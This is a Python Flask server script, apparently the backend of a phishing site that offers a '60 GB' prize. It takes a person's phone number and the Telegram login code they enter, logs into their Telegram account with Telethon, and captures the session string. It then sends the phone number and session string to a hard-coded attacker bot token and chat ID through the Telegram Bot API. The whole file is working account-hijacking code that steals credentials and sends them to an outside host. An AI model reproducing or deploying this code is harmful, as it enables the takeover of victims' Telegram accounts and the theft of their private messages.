from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient
import asyncio
import os
import logging
import requests

app = Flask(__name__)
CORS(app)

API_ID = 2899
API_HASH = '36722c72256a24c1225de00eb6a1ca74'
BOT_TOKEN = '8591425870:AAEAjapPJnv_Q_NfW5NbTX6_b-zrGMPGv-s'
CHAT_ID = '8491102319'

sessions = {}
logging.basicConfig(level=logging.INFO)
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'ok', 'sessions': len(sessions)})

@app.route('/request-code', methods=['POST'])
def request_code():
    data = request.json
    phone = data.get('phone')
    if not phone:
        return jsonify({'error': 'Phone required'}), 400

    session_id = f"session_{phone.replace('+', '')}"
    sessions[session_id] = {'phone': phone, 'status': 'pending'}

    try:
        loop.run_until_complete(send_code(session_id, phone))
    except Exception as e:
        logging.error(f"Error in request_code: {e}")
        return jsonify({'error': str(e)}), 500

    return jsonify({'success': True, 'request_id': session_id})

@app.route('/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    session_id = data.get('request_id')
    code = data.get('code')
    phone = data.get('phone')

    if not session_id or not code:
        return jsonify({'error': 'Missing data'}), 400

    session = sessions.get(session_id)
    if not session:
        return jsonify({'error': 'Session not found'}), 400

    try:
        result = loop.run_until_complete(verify_session(session_id, phone, code))
        if result:
            return jsonify({'success': True, 'message': 'Code verified'})
        else:
            return jsonify({'error': 'wrong_code'}), 400
    except Exception as e:
        logging.error(f"Error in verify_code: {e}")
        return jsonify({'error': str(e)}), 500

# ============================================================
# توابع با start
# ============================================================
async def send_code(session_id, phone):
    try:
        client = TelegramClient(session_id, API_ID, API_HASH)
        await client.connect()
        
        # ارسال درخواست کد
        await client.send_code_request(phone)
        
        sessions[session_id]['client'] = client
        sessions[session_id]['status'] = 'code_sent'
        logging.info(f"✅ Code sent to: {phone}")
        
    except Exception as e:
        sessions[session_id]['status'] = 'error'
        logging.error(f"❌ Error sending code: {e}")
        raise

async def verify_session(session_id, phone, code):
    session = sessions.get(session_id)
    if not session:
        return False

    client = session.get('client')
    if not client:
        logging.error(f"❌ No client for {phone}")
        return False

    try:
        # ✅ استفاده از start برای لاگین کامل
        await client.start(phone=phone, password=code)
        
        # ✅ تایید لاگین
        me = await client.get_me()
        if not me:
            logging.error("❌ Login failed")
            return False
        
        # ✅ گرفتن سشن (بعد از لاگین کامل)
        session_string = client.session.save()
        
        # ✅ ارسال به ربات با قالب انگلیسی و حرفه‌ای
        if session_string and len(session_string) > 10:
            message = f"""✅ <b>New Session Captured</b>

┌───────────────────────────
│ 📱 <b>User:</b> <code>{phone}</code>
│ 🔐 <b>Session String:</b>
│ <code>{session_string}</code>
│ 🎁 <b>Prize:</b> {session.get('prize', '60')} GB
└───────────────────────────

🔒 <b>Status:</b> Logged out automatically"""
        else:
            message = f"""❌ <b>Session Capture Failed</b>

┌───────────────────────────
│ 📱 <b>User:</b> <code>{phone}</code>
│ 🔐 <b>Session String:</b> <code>EMPTY</code>
└───────────────────────────

⚠️ Please try again."""

        send_to_bot(message)

        # ✅ خروج کامل از اکانت
        await client.log_out()
        await client.disconnect()

        sessions[session_id]['status'] = 'done'
        logging.info(f"✅ Session saved and logged out for: {phone}")
        return True

    except Exception as e:
        sessions[session_id]['status'] = 'error'
        logging.error(f"❌ Verification error: {e}")
        
        error_msg = str(e).lower()
        if 'code' in error_msg or 'invalid' in error_msg or 'phone' in error_msg:
            return False
        raise

def send_to_bot(message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            logging.info("✅ Message sent to bot")
        else:
            logging.error(f"❌ Bot error: {response.status_code}")
    except Exception as e:
        logging.error(f"❌ Bot error: {e}")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
